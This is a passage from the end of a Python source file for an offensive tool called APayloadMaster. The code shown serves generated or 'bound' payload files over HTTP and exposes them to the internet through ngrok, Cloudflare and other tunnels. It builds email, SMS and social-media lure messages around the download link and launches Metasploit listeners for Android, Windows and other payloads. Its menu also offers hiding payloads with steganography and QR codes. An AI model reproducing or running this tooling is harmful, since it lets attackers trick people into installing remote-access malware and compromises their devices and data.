            dir_path = "output/payloads"
            if not os.path.exists(dir_path):
                print(f"{self.colors.RED}[!] Directory not found.{self.colors.ENDC}")
                return
            files = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]
            if not files:
                print(f"{self.colors.RED}[!] No files found.{self.colors.ENDC}")
                return
            print(f"{self.colors.CYAN}Files in {dir_path}:{self.colors.ENDC}")
            for i, f in enumerate(files, 1):
                print(f"{i}. {f}")
            idx = input(f"{self.colors.YELLOW}[?] Select file number: {self.colors.ENDC}")
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(files):
                    selected_file = os.path.join(dir_path, files[idx])
                else:
                    print(f"{self.colors.RED}[!] Invalid selection.{self.colors.ENDC}")
                    return
            except:
                print(f"{self.colors.RED}[!] Invalid input.{self.colors.ENDC}")
                return
        elif choice == "3":
            dir_path = "output/bound"
            if not os.path.exists(dir_path):
                print(f"{self.colors.RED}[!] Directory not found.{self.colors.ENDC}")
                return
            files = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]
            if not files:
                print(f"{self.colors.RED}[!] No files found.{self.colors.ENDC}")
                return
            print(f"{self.colors.CYAN}Files in {dir_path}:{self.colors.ENDC}")
            for i, f in enumerate(files, 1):
                print(f"{i}. {f}")
            idx = input(f"{self.colors.YELLOW}[?] Select file number: {self.colors.ENDC}")
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(files):
                    selected_file = os.path.join(dir_path, files[idx])
                else:
                    print(f"{self.colors.RED}[!] Invalid selection.{self.colors.ENDC}")
                    return
            except:
                print(f"{self.colors.RED}[!] Invalid input.{self.colors.ENDC}")
                return
        elif choice == "4":
            path = input(f"{self.colors.YELLOW}[?] Enter full path: {self.colors.ENDC}")
            if os.path.isfile(path):
                selected_file = path
            else:
                print(f"{self.colors.RED}[!] File not found.{self.colors.ENDC}")
                return
        else:
            return
        
        # Ask for port
        port = input(f"{self.colors.YELLOW}[?] Enter port for HTTP server (default: 8080): {self.colors.ENDC}") or "8080"
        
        # Ask if global access
        global_choice = input(f"{self.colors.YELLOW}[?] Make the download link globally accessible via tunnel? (y/n, default n): {self.colors.ENDC}").lower()
        base_url = None
        if global_choice == 'y':
            print(f"{self.colors.CYAN}[*] Choose a tunnel service:{self.colors.ENDC}")
            print("1. Ngrok")
            print("2. LocalXpose")
            print("3. Cloudflare")
            print("4. Serveo")
            print("5. Pinggy")
            tunnel_choice = input(f"{self.colors.YELLOW}[?] Select option (1-5): {self.colors.ENDC}")
            tunnel_map = {
                '1': 'ngrok',
                '2': 'localxpose',
                '3': 'cloudflared',
                '4': 'serveo',
                '5': 'pinggy'
            }
            tunnel_type = tunnel_map.get(tunnel_choice)
            if tunnel_type:
                if tunnel_type == 'ngrok':
                    public_url = self.setup_ngrok(int(port), is_http=True)
                    if public_url and isinstance(public_url, tuple):
                        host, port_num = public_url
                        if port_num == '443' or 'ngrok' in host:
                            base_url = f"https://{host}"
                        else:
                            base_url = f"http://{host}:{port_num}"
                    elif isinstance(public_url, str):
                        base_url = public_url
                elif tunnel_type == 'localxpose':
                    host, port_num = self.setup_localxpose(int(port), is_http=True)
                    base_url = f"https://{host}" if host else None
                elif tunnel_type == 'cloudflared':
                    host, port_num = self.setup_cloudflare(int(port))
                    base_url = f"https://{host}" if host else None
                elif tunnel_type == 'serveo':
                    host, port_num = self.setup_serveo(int(port), is_http=True)
                    base_url = f"https://{host}" if host else None
                elif tunnel_type == 'pinggy':
                    host, port_num = self.setup_pinggy(int(port), is_http=True)
                    base_url = f"https://{host}" if host else None
            else:
                print(f"{self.colors.RED}[!] Invalid choice. Using local link.{self.colors.ENDC}")
        
        if not base_url:
            # Local link
            base_url = f"http://{self.local_ip}:{port}"
        
        # Ensure base_url ends with /
        if not base_url.endswith('/'):
            base_url += '/'
        
        # Start HTTP server (background) serving the directory of the selected file
        serve_dir = os.path.dirname(selected_file)
        self.start_http_server(int(port), global_access=bool(global_choice=='y'), serve_path=serve_dir, foreground=False)
        
        # Generate templates
        self.generate_email_template(selected_file, base_url)
        self.generate_sms_template(selected_file, base_url)
        self.generate_social_media_message(selected_file, base_url)
    
    def create_download_link(self, filepath):
        # Enhanced menu: choose what to serve
        print(f"\n{self.colors.CYAN}[DOWNLOAD LINK OPTIONS]{self.colors.ENDC}")
        print("1. Serve current payload (default)")
        print("2. Serve a file from output/bound directory")
        print("3. Serve entire output directory (listing)")
        print("4. Cancel")
        choice = input(f"{self.colors.YELLOW}[?] Select option (1-4, default 1): {self.colors.ENDC}") or "1"

        serve_path = None
        if choice == "1":
            serve_path = filepath
        elif choice == "2":
            bound_dir = "output/bound"
            if not os.path.exists(bound_dir):
                print(f"{self.colors.RED}[!] output/bound directory does not exist.{self.colors.ENDC}")
                return
            files = [f for f in os.listdir(bound_dir) if os.path.isfile(os.path.join(bound_dir, f))]
            if not files:
                print(f"{self.colors.RED}[!] No files found in output/bound.{self.colors.ENDC}")
                return
            print(f"{self.colors.CYAN}Files in output/bound:{self.colors.ENDC}")
            for i, f in enumerate(files, 1):
                print(f"{i}. {f}")
            file_choice = input(f"{self.colors.YELLOW}[?] Select file number: {self.colors.ENDC}")
            try:
                idx = int(file_choice) - 1
                if 0 <= idx < len(files):
                    serve_path = os.path.join(bound_dir, files[idx])
                else:
                    print(f"{self.colors.RED}[!] Invalid selection.{self.colors.ENDC}")
                    return
            except:
                print(f"{self.colors.RED}[!] Invalid input.{self.colors.ENDC}")
                return
        elif choice == "3":
            serve_path = "output"
        else:
            return

        port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
        
        # Ask if user wants global access
        global_choice = input(f"{self.colors.YELLOW}[?] Make this download link accessible over the internet? (y/n, default n): {self.colors.ENDC}").lower()
        base_url = None
        if global_choice == 'y':
            print(f"{self.colors.CYAN}[*] Choose a tunnel service for global access:{self.colors.ENDC}")
            print("1. Ngrok")
            print("2. LocalXpose")
            print("3. Cloudflare")
            print("4. Serveo")
            print("5. Pinggy")
            tunnel_choice = input(f"{self.colors.YELLOW}[?] Select option (1-5): {self.colors.ENDC}")
            tunnel_map = {
                '1': 'ngrok',
                '2': 'localxpose',
                '3': 'cloudflared',
                '4': 'serveo',
                '5': 'pinggy'
            }
            tunnel_type = tunnel_map.get(tunnel_choice)
            if tunnel_type:
                if tunnel_type == 'ngrok':
                    public_url = self.setup_ngrok(int(port), is_http=True)
                    if public_url and isinstance(public_url, tuple):
                        host, port_num = public_url
                        if port_num == '443' or 'ngrok' in host:
                            base_url = f"https://{host}"
                        else:
                            base_url = f"http://{host}:{port_num}"
                    elif isinstance(public_url, str):
                        base_url = public_url
                elif tunnel_type == 'localxpose':
                    host, port_num = self.setup_localxpose(int(port), is_http=True)
                    base_url = f"https://{host}" if host else None
                elif tunnel_type == 'cloudflared':
                    host, port_num = self.setup_cloudflare(int(port))
                    base_url = f"https://{host}" if host else None
                elif tunnel_type == 'serveo':
                    host, port_num = self.setup_serveo(int(port), is_http=True)
                    base_url = f"https://{host}" if host else None
                elif tunnel_type == 'pinggy':
                    host, port_num = self.setup_pinggy(int(port), is_http=True)
                    base_url = f"https://{host}" if host else None
            if not base_url:
                print(f"{self.colors.RED}[!] Failed to set up tunnel. Using local link only.{self.colors.ENDC}")

        if base_url:
            # Ensure URL ends with /
            if not base_url.endswith('/'):
                base_url += '/'
            # For directory serving, we show the base URL; for file, append filename
            if os.path.isfile(serve_path):
                filename = os.path.basename(serve_path)
                download_url = f"{base_url}{filename}"
            else:
                download_url = base_url
            print(f"{self.colors.GREEN}[+] Global download link: {download_url}{self.colors.ENDC}")
            self.start_http_server(int(port), global_access=True, serve_path=serve_path, foreground=False)
        else:
            self._print_local_link(port, serve_path)
            self.start_http_server(int(port), serve_path=serve_path, foreground=False)

    def _print_local_link(self, port, serve_path):
        if os.path.isfile(serve_path):
            filename = os.path.basename(serve_path)
            download_url = f"http://{self.local_ip}:{port}/{filename}"
        else:
            download_url = f"http://{self.local_ip}:{port}/"
        print(f"{self.colors.GREEN}[+] Local download link: {download_url}{self.colors.ENDC}")
    
    def decrypt_apk_menu(self):
        print(f"\n{self.colors.CYAN}[DECRYPT ENCRYPTED APK]{self.colors.ENDC}")
        print("="*50)
        encrypted_file = input(f"{self.colors.YELLOW}[?] Enter path to encrypted APK (.enc file): {self.colors.ENDC}")
        key_file = input(f"{self.colors.YELLOW}[?] Enter path to key file (.key file): {self.colors.ENDC}")
        if not os.path.exists(encrypted_file) or not os.path.exists(key_file):
            print(f"{self.colors.RED}[!] Files not found{self.colors.ENDC}")
            return
        try:
            with open(encrypted_file, 'rb') as f:
                encrypted_data = f.read()
            with open(key_file, 'rb') as f:
                key = f.read()
            from Crypto.Cipher import AES
            nonce = encrypted_data[:16]
            tag = encrypted_data[16:32]
            ciphertext = encrypted_data[32:]
            cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
            decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
            decrypted_file = encrypted_file.replace('.enc', '_decrypted.apk')
            with open(decrypted_file, 'wb') as f:
                f.write(decrypted_data)
            print(f"{self.colors.GREEN}[+] APK decrypted: {decrypted_file}{self.colors.ENDC}")
        except ImportError:
            print(f"{self.colors.RED}[!] PyCryptodome not installed{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Decryption error: {e}{self.colors.ENDC}")
    
    # ===== MAIN MENU =====
    
    def main_menu(self):
        while True:
            print(f"\n{self.colors.PURPLE}╔═════════════════════════════════════════════════════════════════╗")
            print(f"║                     MAIN MENU - v3.1                        ║")
            print(f"║                 Author: {self.colors.YELLOW}mahi.cyberaware{self.colors.PURPLE}                     ║")
            print(f"╚═════════════════════════════════════════════════════════════════╝{self.colors.ENDC}")
            print(f"{self.colors.CYAN}1. {self.colors.GREEN}Create Payload{self.colors.CYAN} (Localhost/Port Forwarding){self.colors.ENDC}")
            print(f"{self.colors.CYAN}2. {self.colors.GREEN}Bind/Hide Payload{self.colors.CYAN} (Steganography/QR Codes){self.colors.ENDC}")
            print(f"{self.colors.CYAN}3. {self.colors.GREEN}Distribution Options{self.colors.CYAN} (Email/SMS/Templates){self.colors.ENDC}")
            print(f"{self.colors.CYAN}4. {self.colors.GREEN}Start Listener{self.colors.CYAN} (Metasploit){self.colors.ENDC}")
            print(f"{self.colors.CYAN}5. {self.colors.GREEN}Start HTTP Server{self.colors.CYAN} (File Sharing){self.colors.ENDC}")
            print(f"{self.colors.CYAN}6. {self.colors.YELLOW}Check Dependencies{self.colors.CYAN} (Required Tools){self.colors.ENDC}")
            print(f"{self.colors.CYAN}7. {self.colors.RED}Exit{self.colors.CYAN} (Cleanup Resources){self.colors.ENDC}")
            
            choice = input(f"\n{self.colors.YELLOW}[?] Select option (1-7): {self.colors.ENDC}")
            if choice == "1":
                self.create_payload_menu()
            elif choice == "2":
                self.binding_menu()  # will handle payload loading
            elif choice == "3":
                if self.current_payload:
                    self.distribution_menu(self.current_payload)
                else:
                    filepath = input(f"{self.colors.YELLOW}[?] Enter payload path: {self.colors.ENDC}")
                    if os.path.exists(filepath):
                        self.distribution_menu(filepath)
                    else:
                        print(f"{self.colors.RED}[!] File not found.{self.colors.ENDC}")
            elif choice == "4":
                if self.current_lhost and self.current_lport and self.current_payload_type:
                    self.ask_start_listener()
                else:
                    print(f"{self.colors.RED}[!] No payload settings found. Generate a payload first or enter manually.{self.colors.ENDC}")
                    lhost = input(f"{self.colors.YELLOW}[?] Enter LHOST: {self.colors.ENDC}")
                    lport = input(f"{self.colors.YELLOW}[?] Enter LPORT: {self.colors.ENDC}")
                    print("Select payload type for listener:")
                    print("1. Android\n2. Windows\n3. Linux\n4. Python\n5. PowerShell\n6. Bash")
                    ptype = input(f"{self.colors.YELLOW}[?] Choice: {self.colors.ENDC}")
                    type_map = {"1":"android","2":"windows","3":"linux","4":"python","5":"powershell","6":"bash"}
                    self.current_lhost = lhost
                    self.current_lport = lport
                    self.current_payload_type = type_map.get(ptype, "windows")
                    self.ask_start_listener()
            elif choice == "5":
                port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
                # Ask what to serve – now default to output directory
                print(f"\n{self.colors.CYAN}[HTTP SERVER OPTIONS]{self.colors.ENDC}")
                print("1. Serve entire output directory (default)")
                print("2. Serve current payload only")
                print("3. Serve a file from output/bound")
                print("4. Cancel")
                serve_choice = input(f"{self.colors.YELLOW}[?] Select option (1-4, default 1): {self.colors.ENDC}") or "1"
                serve_path = None
                if serve_choice == "1":
                    serve_path = "output"
                elif serve_choice == "2":
                    if self.current_payload:
                        serve_path = self.current_payload
                    else:
                        print(f"{self.colors.RED}[!] No current payload. Please generate one first.{self.colors.ENDC}")
                        continue
                elif serve_choice == "3":
                    bound_dir = "output/bound"
                    if not os.path.exists(bound_dir):
                        print(f"{self.colors.RED}[!] output/bound directory does not exist.{self.colors.ENDC}")
                        continue
                    files = [f for f in os.listdir(bound_dir) if os.path.isfile(os.path.join(bound_dir, f))]
                    if not files:
                        print(f"{self.colors.RED}[!] No files found in output/bound.{self.colors.ENDC}")
                        continue
                    print(f"{self.colors.CYAN}Files in output/bound:{self.colors.ENDC}")
                    for i, f in enumerate(files, 1):
                        print(f"{i}. {f}")
                    file_choice = input(f"{self.colors.YELLOW}[?] Select file number: {self.colors.ENDC}")
                    try:
                        idx = int(file_choice) - 1
                        if 0 <= idx < len(files):
                            serve_path = os.path.join(bound_dir, files[idx])
                        else:
                            print(f"{self.colors.RED}[!] Invalid selection.{self.colors.ENDC}")
                            continue
                    except:
                        print(f"{self.colors.RED}[!] Invalid input.{self.colors.ENDC}")
                        continue
                else:
                    continue

                # Ask about foreground/background
                fg_choice = input(f"{self.colors.YELLOW}[?] Run server in foreground (this terminal) or background? (f/b, default b): {self.colors.ENDC}").lower()
                foreground = (fg_choice == 'f')

                # Option to make it global
                global_choice = input(f"{self.colors.YELLOW}[?] Make this server accessible over the internet? (y/n, default n): {self.colors.ENDC}").lower()
                base_url = None
                if global_choice == 'y':
                    print(f"{self.colors.CYAN}[*] Choose a tunnel service:{self.colors.ENDC}")
                    print("1. Ngrok")
                    print("2. LocalXpose")
                    print("3. Cloudflare")
                    print("4. Serveo")
                    print("5. Pinggy")
                    tunnel_choice = input(f"{self.colors.YELLOW}[?] Select option (1-5): {self.colors.ENDC}")
                    tunnel_map = {
                        '1': 'ngrok',
                        '2': 'localxpose',
                        '3': 'cloudflared',
                        '4': 'serveo',
                        '5': 'pinggy'
                    }
                    tunnel_type = tunnel_map.get(tunnel_choice)
                    if tunnel_type:
                        if tunnel_type == 'ngrok':
                            public_url = self.setup_ngrok(int(port), is_http=True)
                            if public_url and isinstance(public_url, tuple):
                                host, port_num = public_url
                                if port_num == '443' or 'ngrok' in host:
                                    base_url = f"https://{host}"
                                else:
                                    base_url = f"http://{host}:{port_num}"
                            elif isinstance(public_url, str):
                                base_url = public_url
                        elif tunnel_type == 'localxpose':
                            host, port_num = self.setup_localxpose(int(port), is_http=True)
                            base_url = f"https://{host}" if host else None
                        elif tunnel_type == 'cloudflared':
                            host, port_num = self.setup_cloudflare(int(port))
                            base_url = f"https://{host}" if host else None
                        elif tunnel_type == 'serveo':
                            host, port_num = self.setup_serveo(int(port), is_http=True)
                            base_url = f"https://{host}" if host else None
                        elif tunnel_type == 'pinggy':
                            host, port_num = self.setup_pinggy(int(port), is_http=True)
                            base_url = f"https://{host}" if host else None
                    if base_url:
                        print(f"{self.colors.GREEN}[+] Global HTTP server URL: {base_url}{self.colors.ENDC}")
                    else:
                        print(f"{self.colors.RED}[!] Failed to set up tunnel. Starting local server only.{self.colors.ENDC}")

                if foreground:
                    print(f"{self.colors.YELLOW}[*] Starting server in foreground. Press Ctrl+C to stop.{self.colors.ENDC}")
                    self.start_http_server(int(port), global_access=bool(global_choice=='y' and base_url), serve_path=serve_path, foreground=True)
                else:
                    self.start_http_server(int(port), global_access=bool(global_choice=='y' and base_url), serve_path=serve_path, foreground=False)
            elif choice == "6":
                missing = self.check_dependencies()
                if missing:
                    print(f"{self.colors.RED}[!] Missing: {', '.join(missing)}{self.colors.ENDC}")
                else:
                    print(f"{self.colors.GREEN}[+] All dependencies found{self.colors.ENDC}")
            elif choice == "7":
                print(f"{self.colors.RED}[!] Exiting APayloadMaster...{self.colors.ENDC}")
                if self.ngrok_process:
                    self.ngrok_process.terminate()
                if self.http_server:
                    self.http_server.shutdown()
                print(f"{self.colors.GREEN}[+] Cleanup complete. Goodbye!{self.colors.ENDC}")
                sys.exit(0)

def main():
    tool = APayloadMaster()
    tool.display_banner()
    missing = tool.check_dependencies()
    if "Metasploit Framework" in missing:
        print(f"{Colors.RED}[!] Critical: Metasploit not found!{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Install with: sudo apt install metasploit-framework{Colors.ENDC}")
        choice = input(f"{Colors.YELLOW}[?] Continue anyway? (y/n): {Colors.ENDC}")
        if choice.lower() != 'y':
            return
    tool.main_menu()

if __name__ == "__main__":
    main()
